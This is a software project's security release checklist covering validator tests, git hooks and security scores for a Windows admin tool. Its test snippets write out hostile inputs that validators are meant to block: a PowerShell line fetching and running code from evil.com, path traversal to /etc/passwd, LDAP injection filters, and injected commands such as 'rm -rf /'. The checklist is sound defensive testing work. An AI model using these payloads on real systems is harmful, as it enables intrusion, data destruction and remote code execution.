# Security Release Checklist

**Purpose:** Mandatory security validation for every version release
**Last Updated:** February 15, 2026
**Applies To:** All releases (major, minor, patch)

---

## 📋 Pre-Release Security Checklist

### 1. Attack Vector Validation (MANDATORY)

Before pushing **any** release, verify all attack vectors are protected:

#### ✅ 1.1 PowerShell Injection Prevention
- [ ] All `ScriptManager.ExecuteScriptAsync()` calls use `SecurityValidator.ValidatePowerShellScript()`
- [ ] All PowerShell parameters sanitized with `SecurityValidator.SanitizeForPowerShell()`
- [ ] 42 malicious patterns detected (Invoke-Expression, Mimikatz, DownloadString, etc.)
- [ ] Test with malicious script samples from `POWERSHELL_INJECTION_PREVENTION.md`

**Test Command:**
```powershell
# Should be BLOCKED
$malicious = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com')"
SecurityValidator.ValidatePowerShellScript($malicious) # Should return FALSE
```

#### ✅ 1.2 Path Traversal Prevention
- [ ] All file operations use `SecurityValidator.ValidateFilePath()`
- [ ] 5-layer validation active: filename, normalization, containment, extension, size
- [ ] File size limits enforced (5MB logs, 10MB configs, 50MB scripts)
- [ ] Extension whitelist validated (.ps1, .csv, .log, .json, .xml only)

**Test Command:**
```csharp
// Should be BLOCKED
SecurityValidator.ValidateFilePath("C:\\Windows\\..\\..\\..\\sensitive.txt", "C:\\AppData") // FALSE
SecurityValidator.ValidateFilePath("C:\\AppData\\../../etc/passwd", "C:\\AppData") // FALSE
SecurityValidator.ValidateFilePath("C:\\AppData\\file.exe", "C:\\AppData") // FALSE (extension)
```

#### ✅ 1.3 LDAP Injection Prevention
- [ ] All AD queries use `SecurityValidator.ValidateLDAPFilter()`
- [ ] All user input escaped with `SecurityValidator.EscapeLDAPSearchFilter()`
- [ ] RFC 2254 compliance verified
- [ ] OU filters validated with `SecurityValidator.ValidateOUFilter()`

**Test Command:**
```csharp
// Should be BLOCKED
SecurityValidator.ValidateLDAPFilter("(cn=*)(objectClass=*)") // FALSE (LDAP injection)
SecurityValidator.ValidateLDAPFilter("(cn=admin*)(|(uid=*))") // FALSE (complex injection)

// Should be SANITIZED
SecurityValidator.EscapeLDAPSearchFilter("user*)(objectClass=*")
// Returns: "user\2a\29\28objectClass=\2a"
```

#### ✅ 1.4 Command Injection Prevention
- [ ] All remote commands validated (RDP, WinRM, PsExec, AnyDesk, etc.)
- [ ] Computer names validated with `SecurityValidator.ValidateComputerName()`
- [ ] IP addresses validated with `SecurityValidator.ValidateIPAddress()`
- [ ] Hostnames validated with `SecurityValidator.ValidateHostname()`

**Test Command:**
```csharp
// Should be BLOCKED
SecurityValidator.ValidateComputerName("PC-01; rm -rf /") // FALSE (command injection)
SecurityValidator.ValidateIPAddress("192.168.1.1; echo pwned") // FALSE
SecurityValidator.ValidateHostname("host.com`whoami`") // FALSE (backtick injection)
```

#### ✅ 1.5 Authentication Security
- [ ] Rate limiting active: 5 attempts per 5 minutes
- [ ] Exponential backoff enforced (5min → 15min → 45min)
- [ ] Username validation before authentication attempts
- [ ] All auth attempts logged with timestamps
- [ ] Successful auth resets rate limit counters

**Test Command:**
```csharp
// Should be BLOCKED after 5 attempts
for (int i = 0; i < 6; i++)
{
    bool allowed = SecurityValidator.CheckRateLimit("testuser");
    Console.WriteLine($"Attempt {i+1}: {allowed}");
}
// Expected: TRUE x5, then FALSE
```

---

### 2. Security Score Validation

Run the security audit script and verify minimum scores:

```bash
# Run security audit
python security_audit.py

# REQUIRED MINIMUM SCORES:
# - Overall: 90% (A-)
# - SQL Injection: 95%
# - PowerShell Injection: 95%
# - Path Traversal: 95%
# - LDAP Injection: 95%
# - Authentication: 90%
# - Encryption: 90%
```

**Current Score (v2.0):** 94% (A+)

If score drops below 90%, **DO NOT RELEASE** until vulnerabilities are fixed.

---

### 3. Code Review Checklist

#### ✅ 3.1 New Code Security
- [ ] All new user input validated with `SecurityValidator` methods
- [ ] No hardcoded credentials or API keys
- [ ] No `MessageBox` used (use `ToastManager` instead)
- [ ] All exceptions logged with `LogManager.LogError()`
- [ ] Sensitive data encrypted with `SecureCredentialManager`

#### ✅ 3.2 Legacy Fallback Security
- [ ] Legacy methods maintain security validations
- [ ] CSV fallback uses path traversal prevention
- [ ] Access DB connections use parameterized queries
- [ ] Legacy script execution uses PowerShell validation

#### ✅ 3.3 Tag Verification
- [ ] All security code tagged: `#SECURITY_CRITICAL`
- [ ] Attack prevention tagged: `#POWERSHELL_INJECTION_PREVENTION`, `#PATH_TRAVERSAL_PREVENTION`, etc.
- [ ] UI code tagged: `#AUTO_UPDATE_UI_ENGINE`
- [ ] Run tag verification: `python verify_tags.py`

---

### 4. Automated Security Tests

Run the automated security test suite:

```bash
# Unit tests for SecurityValidator
dotnet test SecurityValidatorTests.dll

# Integration tests
dotnet test IntegrationTests.dll --filter Category=Security

# Penetration tests
python penetration_tests.py
```

**Required:** 100% pass rate on security tests

---

### 5. Dependency Security Audit

Check for vulnerable dependencies:

```bash
# NuGet package vulnerability scan
dotnet list package --vulnerable

# PowerShell module security
Get-InstalledModule | ForEach-Object { Find-Module $_.Name -AllVersions | Select-Object -First 1 }
```

**Action:** Update any packages with known vulnerabilities

---

### 6. Build Verification

```bash
# Clean build
msbuild /t:Clean
msbuild /t:Build /p:Configuration=Release

# Verify 0 errors, 0 warnings
# Check build output for security warnings
```

---

### 7. Documentation Update

- [ ] Update `SECURITY_AUDIT_2026.md` with latest scores
- [ ] Add new attack vectors to documentation
- [ ] Update `AssemblyInfo.cs` with security improvements in changelog
- [ ] Update `CHANGELOG.md` with security fixes

---

## 🔒 Git Hooks (Automated Enforcement)

### Pre-Commit Hook

Located: `.git/hooks/pre-commit`

```bash
#!/bin/bash
# TAG: #SECURITY_CRITICAL #GIT_HOOKS #PRE_COMMIT

echo "Running security validation..."

# 1. Check for hardcoded credentials
if grep -r "password\s*=\s*['\"]" --include="*.cs" --include="*.config" .; then
    echo "ERROR: Hardcoded credentials detected!"
    exit 1
fi

# 2. Check for SecurityValidator usage in new PowerShell code
if git diff --cached --name-only | grep -q "ScriptManager.cs"; then
    if ! git diff --cached ScriptManager.cs | grep -q "SecurityValidator.ValidatePowerShellScript"; then
        echo "WARNING: ScriptManager.cs modified without SecurityValidator usage"
        echo "Verify all PowerShell execution is validated"
    fi
fi

# 3. Check for tag compliance
if git diff --cached --name-only | grep -q "Security/.*\.cs"; then
    if ! git diff --cached | grep -q "#SECURITY_CRITICAL"; then
        echo "ERROR: Security code must be tagged #SECURITY_CRITICAL"
        exit 1
    fi
fi

echo "Security validation passed ✓"
```

### Pre-Push Hook

Located: `.git/hooks/pre-push`

```bash
#!/bin/bash
# TAG: #SECURITY_CRITICAL #GIT_HOOKS #PRE_PUSH

echo "Running pre-release security checks..."

# 1. Run security score check
SCORE=$(python security_audit.py --score-only)
if [ "$SCORE" -lt 90 ]; then
    echo "ERROR: Security score $SCORE% is below minimum 90%"
    exit 1
fi

# 2. Run unit tests
dotnet test --filter Category=Security
if [ $? -ne 0 ]; then
    echo "ERROR: Security tests failed"
    exit 1
fi

# 3. Check for vulnerable dependencies
dotnet list package --vulnerable > /tmp/vuln.txt
if grep -q "Critical\|High" /tmp/vuln.txt; then
    echo "ERROR: Critical/High severity vulnerabilities detected"
    cat /tmp/vuln.txt
    exit 1
fi

echo "Pre-release security checks passed ✓"
```

---

## 📊 Security Metrics Dashboard

Track security improvements over time:

| Version | Date | Security Score | PowerShell | Path Traversal | LDAP | Auth | Notes |
|---------|------|----------------|------------|----------------|------|------|-------|
| 1.0 | 2025-11 | 65% (D) | ❌ | ❌ | ❌ | ⚠️ | Initial release |
| 1.5 | 2026-01 | 78% (C+) | ⚠️ | ⚠️ | ❌ | ⚠️ | Basic validation |
| 2.0 | 2026-02 | **94% (A+)** | ✅ | ✅ | ✅ | ✅ | SecurityValidator |

**Target:** Maintain 90%+ security score for all future releases

---

## 🚨 Security Incident Response

If a vulnerability is discovered in production:

1. **Immediate:** Create hotfix branch
2. **Assess:** Determine attack vector and impact
3. **Fix:** Implement SecurityValidator protection
4. **Test:** Run full security test suite
5. **Deploy:** Emergency patch release
6. **Document:** Add to `SECURITY_INCIDENTS.md`
7. **Review:** Update checklist to prevent recurrence

---

## ✅ Release Sign-Off

**Before tagging any release, ALL items must be checked:**

- [ ] All 5 attack vectors validated (PowerShell, Path, LDAP, Command, Auth)
- [ ] Security score ≥ 90%
- [ ] All security tests pass
- [ ] No vulnerable dependencies
- [ ] Clean build (0 errors, 0 security warnings)
- [ ] Documentation updated
- [ ] Git hooks installed and passing
- [ ] Code review completed
- [ ] Legacy fallbacks secured

**Release Manager Signature:** _________________
**Date:** _________________
**Version:** _________________

---

## 📚 References

- `SECURITY_AUDIT_2026.md` - Complete security audit report
- `POWERSHELL_INJECTION_PREVENTION.md` - PowerShell attack vectors
- `LDAP_INJECTION_PREVENTION.md` - LDAP attack vectors
- `SECURITY_INTEGRATION_COMPLETE.md` - Integration documentation
- `Security/SecurityValidator.cs` - Security validation implementation

---

**REMEMBER:** Security is not optional. Every release MUST pass all checks.
**"Secure by default, not by accident."**
